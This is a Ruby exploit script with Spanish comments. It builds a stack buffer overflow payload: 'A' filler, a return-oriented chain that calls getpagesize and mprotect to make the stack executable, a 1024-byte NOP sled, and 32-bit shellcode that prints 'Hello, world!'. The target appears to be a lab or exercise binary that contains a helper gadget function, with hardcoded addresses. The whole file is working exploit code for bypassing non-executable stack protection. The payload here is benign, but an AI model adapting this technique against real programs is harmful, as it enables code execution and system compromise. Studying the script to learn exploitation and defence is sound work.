#!/usr/bin/ruby

#====================================================================
# PARÁMETROS DE CONFIGURACIÓN
#--------------------------------------------------------------------

FILLER_LENGTH = 0x48

NOPSLED_LENGTH = 1024

FRAME_BASE_ADDRESS = 0xffffd0d8

GETPAGESIZE_ADDRESS = 0xf7ecc050

MPROTECT_ADDRESS = 0xf7ecf660

AID_FUNCTION_ADDRESS = 0x0804844f

PAYLOAD =
"\xE8\x30\x00\x00\x00\x48\x65\x6C" +
"\x6C\x6F\x2C\x20\x77\x6F\x72\x6C" +
"\x64\x21\xB8\x09\x00\x00\x00\x40" +
"\x88\x41\x0D\xBB\x01\x00\x00\x00" +
"\xBA\x0E\x00\x00\x00\xB8\x04\x00" +
"\x00\x00\xCD\x80\x31\xDB\xB8\x01" +
"\x00\x00\x00\xCD\x80\x59\xEB\xDA"

#===================================================================
# EXPLOIT
#-------------------------------------------------------------------

# Generamos los bytes para llenar y desbordar el buffer.
filler = 'A'*FILLER_LENGTH

target_addr = FRAME_BASE_ADDRESS + 4 + NOPSLED_LENGTH/2

chain = [
  GETPAGESIZE_ADDRESS,            # &getpagesize
  AID_FUNCTION_ADDRESS + 13,      # mov ecx, eax; ret
  AID_FUNCTION_ADDRESS + 16,      # inc ecx; ret
  AID_FUNCTION_ADDRESS + 18,      # dec eax; ret
  AID_FUNCTION_ADDRESS + 20,      # not eax; ret
  AID_FUNCTION_ADDRESS + 23,      # pop ebx; ret
  target_addr,
  AID_FUNCTION_ADDRESS + 25,      # and ebx, eax; ret
  AID_FUNCTION_ADDRESS + 28,      # pop edx; ret
  0x7,
  MPROTECT_ADDRESS + 13,          # &mprotect
  0x41414141,                     # AAAA
  target_addr
].pack('V*')

# Generamos el nopsled.
nopsled = "\x90"*NOPSLED_LENGTH

# Emitimos el exploit completo.
exploit = [
  filler, 
  chain,
  nopsled,
  PAYLOAD].map do |x|
  x.force_encoding("ASCII-8BIT")
end

print exploit.join
